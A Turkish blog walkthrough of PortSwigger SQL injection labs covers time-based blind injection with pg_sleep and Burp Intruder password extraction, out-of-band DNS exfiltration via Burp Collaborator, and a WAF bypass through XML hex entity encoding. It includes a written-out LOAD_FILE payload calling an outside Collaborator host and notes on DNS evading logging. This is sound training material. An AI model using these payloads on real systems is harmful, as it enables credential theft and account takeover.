Bu lab’ı çözmek için bilinmesi gereken şey, gönderdiğimiz sorgudaki koşulun doğru ya da yanlış olmasına bağlı olarak zaman gecikmelerini tetikleyip blind SQLi açığından yararlanmaya çalışmak. SQL sorguları normalde uygulama tarafından senkronize olarak işlendiğinden, bir SQL sorgusunun yürütülmesinin geciktirilmesi aynı zamanda HTTP yanıtını da geciktiriyor. Bu da HTTP yanıtını almak için geçen süreye bağlı olarak gönderdiğimiz sorgudaki koşulun doğruluğunu belirlememizi sağlıyor. Bunun dışında bilinmesi gereken bir diğer konu da, sorguyu veritabanı türüne göre yapmamız gerektiği. Her veritabanının syntax’ı değişir ve veritabanı türüne göre sorgu yapmamız gerekir.

Lab’a döndüğümüzde öncelikle veritabanının Oracle olduğunu söylemiyorsa ya MySQL ya da PostgreSQL’dir. Çünkü toplam 13 tane lab çözdük ve artık genel olarak PostgreSQL kullandıklarına eminim diyebilirim 😅 Bu yüzden buna göre sorgu deneyeceğim. PostgreSQL için

![](https://cdn-images-1.medium.com/max/800/1*230huWylDgzbmvrT5B_j9w.png)

sorgunun bu şekilde olduğunu bize hint kısmında verilen linkten araştırıp buldum.

![](https://cdn-images-1.medium.com/max/800/1*6gqFXPsv8fL_e01ueY3vZA.png)

Bu şekilde bir istek yaptım ve sonucun gelmesi 10 saniye süreceğinden bekledikten sonra lab’ı başarılı bir şekilde çözmüş olduk.

### 15\. Lab: Blind SQL injection with time delays and information retrieval

> **Lab açıklaması:**  
> Bu laboratuvar blind SQLi güvenlik açığı içeriyor. Uygulama, analiz için bir tracking çerezi kullanır ve gönderilen çerezin değerini içeren bir SQL sorgusu gerçekleştirir. SQL sorgusunun sonuçları döndürülmez ve uygulama, sorgunun satır döndürmesine veya hataya neden olmasına bağlı olarak farklı yanıt vermez. Ancak sorgu senkronize olarak yürütüldüğünden, bilgi çıkarmak için koşullu zaman gecikmelerini tetiklemek mümkündür. Veritabanı, kullanıcı adı ve parola adı verilen sütunlara sahip, users adı verilen farklı bir tablo içerir. Laboratuvarı çözmek için `administrator` kullanıcının şifresini sızdırmanın bir yolunu bulun ve ardından hesabında oturum açın.

Burada yine bir önceki lab’da olduğu gibi zaman tabanlı bir açık söz konusu. İlk olarak 10 saniye bekletip sonuç alacağım bir sorgu yazmalıyım.

![](https://cdn-images-1.medium.com/max/800/1*XVpc0UYUEtb1UOKhm6l91g.png)

Bu sorudaki `%3B` ifadesini `;` encoding etmek için kullandım. Başka bir sorgu yazmak için yani sorguları ayırmak için kullandım çünkü farklı şeyler denediğimde başarılı olmadı. Devamındaki `CASE WHEN (1=1)` koşulu başarılı olduğunda `pg_sleep(10)` ifadesi çalışacak aksi halde `pg_sleep(0)` çalışacak. Bu koşulu `1=2` olarak denediğimde ise gecikme olmadan anında yanıt veriyor. Şimdi administrator kullanıcısını doğrulamak için

![](https://cdn-images-1.medium.com/max/800/1*yoDyUhO9AU1idupmQXAyiA.png)

böyle bir sorgu girdiğimde de 10 saniye bekletiyor. Buna da emin olduktan sonra artık şifresinin kaç haneli olduğunu belirlemek için

![](https://cdn-images-1.medium.com/max/800/1*CFOrQm4iylO33IeXbAdOjA.png)

bu sorguyu gönderiyorum ve yine 10 saniye bekletti yani şifrenin 20 karakterli olduğuna emin oldum.

![](https://cdn-images-1.medium.com/max/800/1*shfBAVzidzhNkjTDtHJVfg.png)

Bu sorguyu her karakterini tek tek tespit etmek için kullanacağım. Bu yüzden isteği intruder’a gönderiyorum ve önceki lab’larda yaptığımız işlemleri yapıyorum. Brute forcer seçip payload’daki min ve max değerlerini 1 yapıyorum böylece 36 payload’a düşüyor deneme sayısı. Ardından şifrede doğru olan karakterin 10 saniyede gittiğini anlamak için Resource pool kısmındaki max concurrent requests değerini 1 yapıyorum ve saldırıyı başlatıyorum. Her karakter için password karakter kısmını 20 kez değiştiriyorum. Response received kısmındaki değer 10k değerinde bir sayı geliyor. Buradan doğru olan payloadı anlıyorum. Elde ettiğim şifreyle administrator kullanıcısına giriş yapıyorum ve lab’ı başarılı bir şekilde çözmüş oluyoruz.

### 16\. Lab: Blind SQL injection with out-of-band interaction

> **Lab açıklaması:**  
> Bu laboratuvar blind SQLi güvenlik açığı içeriyor. Uygulama, analiz için bir tracking çerezi kullanır ve gönderilen çerezin değerini içeren bir SQL sorgusu gerçekleştirir. SQL sorgusu asenkron olarak yürütülür ve uygulamanın yanıtı üzerinde hiçbir etkisi yoktur. Ancak harici bir alanla bant dışı etkileşimleri tetikleyebilirsiniz. Laboratuvarı çözmek için SQL enjeksiyon güvenlik açığından yararlanarak Burp Collaborator’da DNS araması yapın.  
> **Not:**  
> Akademi platformunun üçüncü taraflara saldırmak için kullanılmasını önlemek amacıyla güvenlik duvarımız, laboratuvarlar ve keyfi harici sistemler arasındaki etkileşimleri engeller. Laboratuvarı çözmek için Burp Collaborator’ın varsayılan genel sunucusunu kullanmanız gerekir.

Bu lab özelinde bilinmesi gerekenlerden başlayacağım yine. Öncelikle “out-of-band” ifadesi “bant dışı” olarak çevriliyor. Bu tür durumlarda sorguların sonucu direkt olarak web uygulamasının yanıtına yansımadığı için bir yanıt almayız. Bu yüzden başka bir yolla veri sızdırmak için DNS üzerinden dış bir etkileşim yapıyoruz. Toparlayacak olursak, yanıtı direkt olarak göremediğimiz durumlarda saldırının başarılı olup olmadığını anlamak için başka yollar arıyoruz. Mesela bir DNS sorgusu yaptırarak bunu bir dış sunucudan kontrol edebiliyoruz. Burp Collaborator da bize bunu sağlıyor. DNS, HTTP ya da SMTP gibi protokoller üzerinden gelen istekleri algılayabiliyor. Bu durumda amacımız web sunucusunun DNS isteği yapmasını sağlamak. Collaborator’ı açıp kendimize özel bir URL oluşturuyoruz. Mesela `btekinli.burpcollaborator.net` gibi. Şimdi bu URL’i ne yapacağımızı soracaksınız biliyorum ona da şimdi geliyoruz. Önceki lab’lardan da gördüğümüz üzere web uygulaması, gönderdiğimiz cookie değerini SQL sorgusunda kullanıyor. Bu değeri değiştirdiğimizde sorguya enjekte edeceğimiz bir komut yazıyoruz. İşte tam da bu kısımda DNS sorgusu yapacak bir SQL komutu yazmalıyız. Mesela `TrackingId` cookie’sine şu SQL komutunu yerleştirebiliriz:

' UNION SELECT LOAD\_FILE('\\\\\\\\btekinli.burpcollaborator.net\\\\test') --

Burdaki `LOAD_FILE()` fonksiyonuyla bir dosya okunmak isteniyor gibi gösteriyoruz fakat sunucu, dosya yerine DNS üzerinden bir sorgu gönderiyor ve bu sorgu Collaborator sunucusuna ulaşıyor. Sorgunun collaborator üzerinde görüntülenmesi, SQLi saldırısının başarılı olduğunu ve sunucunun isteği gönderdiğini doğrulamış oluyor. DNS isteği görülürse blind SQLi zafiyeti olduğunu ve sorgularımızı çalıştırabileceğimizi de anlamış oluyoruz. Ben bu konuya çalışırken **_neden HTTP değil de DNS kullanıldığını_** da merak etmiştim size de onun sebebini anlatmak istiyorum. Aslında bunun birçok sebebi var ben de bazılarını sıralayacağım:  
**1.** Güvenlik duvarı ya da WAF gibi sistemler, HTTP üzerinden yapılan dış bağlantı taleplerini engelliyor fakat DNS istekleri serbest bırakılıyor. Çünkü DNS internet bağlantısının bir parçası.  
**2.** DNS, IP adreslerini çözümlerken sadece küçük veri parçaları aktarıyor ve bu transferleri bant dışı veri sızdırmak için kullanabiliyoruz. Bu senaryoda da yapacağımız gibi basit sorgularla sunucudan dışarıya bilgi aktarılabilir ya da saldırının başarılı olup olmadığını doğrulayabiliriz. Kısaca DNS’in asenkron çalışması ve veri paketlerini direkt olarak incelememesi bu tür zafiyet senaryolarında bize büyük bir avantaj sağlıyor.  
**3.** Saldırıyı daha gizli kılmak için de DNS tercih etmek mantıklı oluyor çünkü DNS istekleri loglanmıyor ve HTTP kadar incelenmiyor.  
**4.** HTTP bant dışı veri akışlarında daha karmaşık bir protokol olması sebebiyle DNS kadar hızlı çalışmıyor.

Neyi neden yapacağımızı anladığımızı düşünüyorum. Son olarak Burp Suite Pro kullanıyorum bu yüzden collaborator özelliğinde yapacağım Community özelliğinde yok bilginiz olsun. Artık lab’a geçebiliriz. İlk olarak sorguyu

![](https://cdn-images-1.medium.com/max/800/1*0t11a3gw8aCj7PeQqwy4hA.png)

hint kısmında verilen [SQLi cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) sayfasından alıyorum. Collaborator’dan bir URL alıyorum ve bunu sorgu içinde belirtilen `BURP-COLLABORATOR-SUBDOMAIN` kısmına yapıştırıyorum.

![](https://cdn-images-1.medium.com/max/800/1*me9J66siGM7uosVQ15z0Bg.png)

İsteği gönderdiğimde tekrar collaborator’a gidip poll now yaparak DNS olarak geldiğini görüntülüyorum. Böylece lab’ı başarılı bir şekilde çözmüş oluyoruz.

### 17\. Lab: Blind SQL injection with out-of-band data exfiltration

> **Lab açıklaması:**  
> Bu laboratuvar blind SQLi güvenlik açığı içeriyor. Uygulama, analiz için bir tracking çerezi kullanır ve gönderilen çerezin değerini içeren bir SQL sorgusu gerçekleştirir. SQL sorgusu asenkron olarak yürütülür ve uygulamanın yanıtı üzerinde hiçbir etkisi yoktur. Ancak harici bir alanla bant dışı etkileşimleri tetikleyebilirsiniz. Veritabanı, kullanıcı adı ve parola adı verilen sütunlara sahip, `users` adı verilen farklı bir tablo içerir. Yönetici kullanıcının şifresini bulmak için blind SQLi güvenlik açığından yararlanmanız gerekir. Laboratuvarı çözmek için administrator kullanıcı olarak oturum açın.

Bu lab’da da yine bir önceki lab’da olduğu mantıkla hareket edicez tek fark users tablosundaki kullanıcı adları ve parolalar kısmından administrator kullanıcısının şifresini sızdırıp onun hesabına giriş yaparak lab’ı çözmemizi istiyor. Bir önceki lab’da sadece collaborator kullanımını öğretmek için burp subdomain’ini kullanabilmemizi ve blind SQLi türünün DNS ile mantığını anlamamızı istiyordu. Şimdi ayrıca sorguyu da farklılaştırıp şifre sızdırmamızı istiyor. Lab’a girdiğimizde yine `/` sayfa yüklendiğinde bize bir tracking id veriliyor. Bunun için de gerekli sorguyu

![](https://cdn-images-1.medium.com/max/800/1*K9LObv92396BUpVchA1weA.png)

yine buradan aldım ve ek olarak subquery ekleyip şifreyi `users` tablosundan çeken bir sorgu ekledim.

![](https://cdn-images-1.medium.com/max/800/1*tQasywQ-6-9JvRn2RiUW5g.png)

Buradaki burp subdomain’i almak için aşağıdaki 1 numaralı kısımdan kopyaladım.

![](https://cdn-images-1.medium.com/max/800/1*kDsFuQvZUZDqVNgvEse2bA.png)

Ardından isteği yaptıktan sonra eğer bu ekrana döndüğünüzde düşmüyorsa 2 numaralı kısımdaki “Poll now” adlı butona basabilirsiniz. Sonrasında 3 numaralı DNS türündeki kısma bastığımızda yeşil ok ile belirtilen yerde administrator kullanıcısının şifresinin sızdırıldığını görüyoruz. Son olarak bu şifreyle giriş yaptığımızda lab’ı başarılı bir şekilde çözmüş oluyoruz.

### 18\. Lab: SQL injection with filter bypass via XML encoding

> **Lab açıklaması:**  
> Bu laboratuvarın stok kontrolü özelliğinde bir SQL ekleme güvenlik açığı bulunmaktadır. Sorgunun sonuçları uygulamanın yanıtında döndürülür, böylece diğer tablolardan veri almak için UNION saldırısını kullanabilirsiniz. Veritabanı, kayıtlı kullanıcıların kullanıcı adlarını ve şifrelerini içeren bir `users` tablosu içerir. Laboratuvarı çözmek için yönetici kullanıcının kimlik bilgilerini almak üzere bir SQL enjeksiyon saldırısı gerçekleştirin ve ardından hesaplarında oturum açın.  
> **Hint:**  
> Bir web uygulaması güvenlik duvarı (WAF), SQLi saldırısının bariz işaretlerini içeren istekleri engelleyecektir. Bu filtreyi atlamak için kötü amaçlı sorgunuzu gizlemenin bir yolunu bulmanız gerekir. Bunu yapmak için Hackvertor uzantısını kullanmanızı öneririz.

Lab açıklamasında stok kontrol özelliğinde bir SQLi açığı olduğu belirtildiğinden ilk gördüğüm ürüne gidip isteği burp ile yakalıyorum.

![](https://cdn-images-1.medium.com/max/800/1*hTre_o5_vRjrmUf31gv8Pw.png)

İlk isteği inceleyip dikkatimi çeken yerleri işaretledim. Burada produc id kısmını 2 yapıp tekrar bir istek atıyorum ve sonuç olarak 408 units döndü. Ardından store id kısmını da 2 olarak manipüle ettim ve 239 units döndüğünü gördüm. Buradan farklı mağazalara ait stokları döndürdüğünü anlamış olduk. Bize UNION ile saldırı yapmamız gerektiğini de lab açıklamasında bildirmişlerdi. Bu durumda ben de store id kısmına UNION SELECT sorgusu yapıyorum.

![](https://cdn-images-1.medium.com/max/800/1*sh9HnUawnObLXEQXkW8oNQ.png)

Fakat burada 403 döndürüp “saldırı tespit edildi” diye bir mesaj veriyor. Bunu da lab’ın ipucu kısmında anlatmışlar. Güvenlik duvarı bazı sorguları tespit edebiliyormuş. Bize de bunu bypass edebilmek için sorgumuzu gizlemenin bir yolunu bulmamızı hatta Hackvertor eklentisiyle yapabilmemiz için ipucu vermişler. Burp içinde eklentiyi indirdikten sonra

![](https://cdn-images-1.medium.com/max/800/1*Gr0brImLutbkN3MZZc6LEg.png)

yazdığım sorguyu bu şekilde seçiyorum ve sağ tıklıyorum ardından **_Extensions > Hackvertor > Encode > hex\_entities_** seçiyorum. Burada `@html5_entities` de var ve neden onu değil de `@hex_entities` seçtiğimizi sorabilirsiniz. Sebebi şu, html, xml ile kullanıldığında sadece `<>` ifadelerini parse ediyor ama burada hex yani 16'lık tabanda yapıyoruz ki WAF’ı bypass edebilelim. Kısaca bu şekilde açıklayıp lab çözümüne devam ediyorum. Yukarıda görüldüğü gibi `@hex_entities` şeklinde sorgunun etrafı bu taglarla sarmalandıktan sonra `'beyza'` yazıp gönderiyorum ve bu isimde bir şey dönüyor. Bize kullanıcı adı ve parola dedikleri için 2 sütunu çekebileyim diye yanına bir de `'test'` yazıp gönderiyorum.

![](https://cdn-images-1.medium.com/max/800/1*Qom6UMCr0vwo6XgX5-RmwQ.png)

Fakat 0 units geldi demek ki sadece bir sütun var kullanabileceğim. Bu da demek oluyor ki 10. lab’da yaptığımız gibi tek sütunda kullanıcı adı ve parolaları birleştirme yapacağız.

![](https://cdn-images-1.medium.com/max/800/1*ZhEiMC6TAmbAPt1DzljUMQ.png)

Onu da bu şekilde yaptıktan sonra tek sütunda kullanıcı adı ve parolalarına eriştik. Administrator hesabıyla giriş yapıyorum ve lab’ı başarılı bir şekilde çözmüş oluyoruz.

Tüm SQLi lab’larını çözmüş olduk. Umarım herkes için faydalı olur. Başka konuların lab’larında görüşmek üzere. Happy Hacking 👾
